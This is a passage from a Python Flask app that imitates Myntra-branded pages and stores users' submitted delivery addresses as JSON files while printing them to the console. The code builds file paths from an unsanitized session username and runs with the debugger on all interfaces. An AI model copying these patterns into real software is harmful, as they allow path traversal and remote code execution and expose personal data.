        address_file = os.path.join(SESSION_DATA_DIR, f"{session.get('username', 'anonymous')}_address.json")
        with open(address_file, 'w') as f:
            json.dump(address_data, f, indent=4)

        print("\n✅ [INFO] Delivery address submitted:")
        print(json.dumps(address_data, indent=4))
        return redirect(url_for('success'))

    return render_template("myntra-address.html")

@app.route('/success')
def success():
    return render_template("myntra-successful.html")


@app.route('/myntrahome')
def myntra_home():
    return render_template("myntrahome.html")


@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login'))

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
